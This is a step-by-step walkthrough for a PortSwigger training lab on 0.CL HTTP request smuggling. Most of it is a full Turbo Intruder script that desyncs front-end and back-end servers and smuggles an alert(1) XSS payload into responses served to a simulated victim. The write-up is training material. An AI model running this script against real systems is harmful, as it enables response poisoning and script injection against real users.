
## Guided Walkthrough: [0.CL Request Smuggling Lab](https://portswigger.net/web-security/request-smuggling/advanced/lab-request-smuggling-0cl-request-smuggling) (with Turbo Intruder)

### Lab goal

- **Objective:** Exploit a **0.CL request smuggling** bug so **Carlos** executes `alert(1)` in his browser.
- **Key idea:** Use a **double desync**:
  - 0.CL mismatch between front-end and back-end.
  - Smuggle an XSS payload in a request that eventually gets served to Carlos.

---

## Step 1 – Capture baseline requests and discover a static gadget

1. Open the lab in your browser (through Burp Proxy).
2. In **Proxy → HTTP history**, locate:
   - The main homepage request:

     ```http
     GET / HTTP/1.1
     Host: <LAB-HOST>.web-security-academy.net
     ```

   - Several static resources under `/resources/...`, e.g. from your traffic:

     - `/resources/labheader/css/academyLabHeader.css.map` (404)
     - `/resources/css/labsBlog.css.map` (400)
     - `/resources/labheader/js/labHeader.js` (**200**)

3. Note the **LAB-HOST** subdomain that is active for the lab session:

   ```text
   <LAB-HOST>.web-security-academy.net
   ```

4. Pick a **real static gadget path** that returns 200:

   ```text
   /resources/labheader/js/labHeader.js
   ```

> Note: in multiple solves, this turned out not to be a hard requirement. The lab environment is flexible enough that other `/resources/...` gadget paths (including ones not seen in initial traffic, like `/resources/css/anything`) can also work reliably.

---

## Step 2 – Craft a clean homepage request in Repeater

This is the request you’ll send to Turbo Intruder as the seed.

1. In **Proxy → HTTP history**, right-click the `GET /` request → **Send to Repeater**.
2. In Repeater, modify the request to something simple like:

   ```http
   GET / HTTP/1.1
   Host: <LAB-HOST>.web-security-academy.net
   User-Agent: foo
   Accept: text/html
   Connection: close
   ```

3. Send it once to confirm you get the normal homepage.

This Repeater tab is now your **launchpad** for Turbo Intruder.

---

## Step 3 – (Optional but nice) sanity-check the gadget in Repeater

1. Open a new Repeater tab.
2. Craft and send a simple GET to your gadget:

   ```http
   GET /resources/labheader/js/labHeader.js HTTP/1.1
   Host: <LAB-HOST>.web-security-academy.net
   ```

3. Confirm you get a 200 with the JS payload.

This confirms `/resources/labheader/js/labHeader.js` is a **valid early-response gadget**.

---

## Step 4 – Send the crafted homepage request from Repeater to Turbo Intruder

1. Go back to your **crafted `GET /`** Repeater tab (from Step 2).
2. Right-click inside the request → **Extensions → Turbo Intruder**.
3. Turbo Intruder opens with that request as the base; it uses only the **endpoint** (scheme/host/port) from it.

This preserves your preferred flow: **craft in Repeater first, then send to TI**.

---

## Step 5 – Drop in the 0.CL Turbo Intruder exploit script

In the Turbo Intruder script pane:

1. Select all, then paste this script (only two values to edit: `host` and `GADGET_PATH`):

```python
# 0.CL double-desync exploit – using real static gadget path

host = '<LAB-HOST>.web-security-academy.net'                        # <<< EDIT per lab
GADGET_PATH = '/resources/labheader/js/labHeader.js'                # <<< Can optionally edit, or leave as is if matching real traffic

def queueRequests(target, wordlists):
    engine = RequestEngine(
        endpoint=target.endpoint,
        concurrentConnections=10,
        requestsPerConnection=1,
        engine=Engine.BURP,
        maxRetriesPerRequest=0,
        timeout=15
    )

    # Stage 1: early-response gadget; %s is replaced with len(stage2_chopped)
    stage1 = '''POST ''' + GADGET_PATH + ''' HTTP/1.1
Host: '''+host+'''
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive
Content-Length : %s

'''

    # Smuggled request carrying XSS via User-Agent
    # Adjust postId if your lab instance uses a different one
    smuggled = '''GET /post?postId=8 HTTP/1.1
User-Agent: a"/><script>alert(1)</script>
Content-Type: application/x-www-form-urlencoded
Content-Length: 5

x=1'''

    # Stage 2 (chopped)
    stage2_chopped = '''OPTIONS / HTTP/1.1
Content-Length: 123
X: Y'''

    # Stage 2 (revealed)
    stage2_revealed = '''GET /404 HTTP/1.1
Host: '''+host+'''
User-Agent: foo
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive

'''

    # Victim – Carlos/homepage
    victim = '''GET / HTTP/1.1
Host: '''+host+'''
User-Agent: foo

'''

    if '%s' not in stage1:
        raise Exception('Please place %s in the Content-Length header value')

    if not stage1.endswith('\r\n\r\n'):
        raise Exception('Stage1 request must end with a blank line and have no body')

    while True:
        engine.queue(stage1, len(stage2_chopped), label='stage1', fixContentLength=False)
        engine.queue(stage2_chopped + stage2_revealed + smuggled, label='stage2')
        engine.queue(victim, label='victim')


def handleResponse(req, interesting):
    table.add(req)

    if req.label == 'victim' and 'Congratulations' in req.response:
        req.engine.cancel()
```

2. Ensure:

   - `host` exactly matches the current lab host.
   - `GADGET_PATH` matches the static JS path you saw in traffic.
   - If your lab’s blog uses a different post ID, change `/post?postId=8` accordingly.

---

## Step 6 – Run the attack and monitor

1. Click **Attack** in Turbo Intruder.
2. While it’s running:
   - You’ll see lots of `stage1`, `stage2`, and `victim` rows with status codes like 200, 400, or 404. That’s normal for this lab.
3. When the exploit succeeds:
   - The lab backend’s simulated Carlos client, which periodically makes `GET /` requests, will eventually receive a poisoned response that triggers your payload and causes the solved lab page to include “Congratulations”.
   - `handleResponse` will see “Congratulations” in a `victim` response, call `req.engine.cancel()`, and stop the attack.
   - When you view or refresh the lab page, you should see **“Congratulations, you solved the lab!”** and the lab marked **Solved**.

